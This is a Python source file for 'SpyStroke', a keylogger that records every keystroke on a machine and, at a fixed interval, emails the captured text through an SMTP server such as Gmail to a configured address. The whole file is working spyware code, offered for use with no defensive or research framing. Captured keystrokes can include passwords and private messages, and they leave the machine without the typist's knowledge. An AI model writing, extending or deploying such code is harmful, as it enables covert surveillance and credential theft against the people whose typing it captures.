#!/usr/bin/env python
"""Email-based SpyStroke keylogger.

Backwards-compatible wrapper around the shared engine: keeps the original
``Keylogger(time_interval, email, password)`` constructor signature while
using the thread-safe buffer and retrying email reporter from the
``spystroke`` package.

Configuration can also be provided via environment variables (see
``spystroke.config``), which is the recommended approach.
"""

from __future__ import annotations

import logging
import os
import sys
import threading
import time
from typing import Optional

# Make the shared package importable regardless of the working directory.
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from spystroke.core import KeyListener  # noqa: E402
from spystroke.email_reporter import EmailReporter  # noqa: E402

logger = logging.getLogger(__name__)

__all__ = ["Keylogger"]


class Keylogger:
    """Captures keystrokes and emails them on a fixed interval."""

    def __init__(
        self,
        time_interval: int,
        email: str,
        password: str,
        receiver: Optional[str] = None,
        smtp_host: str = "smtp.gmail.com",
        smtp_port: int = 587,
        use_starttls: bool = True,
    ) -> None:
        self.interval = time_interval
        self.listener = KeyListener()
        self.reporter = EmailReporter(
            sender=email,
            password=password,
            receiver=receiver,
            smtp_host=smtp_host,
            smtp_port=smtp_port,
            use_starttls=use_starttls,
        )
        self._stop_event = threading.Event()

    def start(self) -> None:
        """Start capturing and reporting until stopped (or Ctrl+C)."""
        self._stop_event.clear()
        self.listener.start()
        logger.info("Keylogger started; reporting every %ss", self.interval)
        try:
            while not self._stop_event.is_set():
                # Check for shutdown frequently so stop() is responsive.
                if self._stop_event.wait(self.interval):
                    break
                text = self.listener.buffer.drain()
                if text:
                    subject = f"SpyStroke report - {time.strftime('%Y-%m-%d %H:%M:%S')}"
                    self.reporter.send(subject=subject, body=text)
        except KeyboardInterrupt:
            logger.info("Interrupted, stopping")
        finally:
            self.listener.stop()
            logger.info("Keylogger stopped")

    def stop(self) -> None:
        """Request a graceful stop from another thread."""
        self._stop_event.set()


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    # Prefer environment variables; fall back to CLI-style arguments for
    # backwards compatibility with the original script.
    email = os.getenv("SPYSTROKE_EMAIL", "your_email@gmail.com")
    password = os.getenv("SPYSTROKE_EMAIL_PASSWORD", "your_email_password")
    interval = int(os.getenv("SPYSTROKE_INTERVAL", "120"))
    keylogger = Keylogger(interval, email, password)
    keylogger.start()
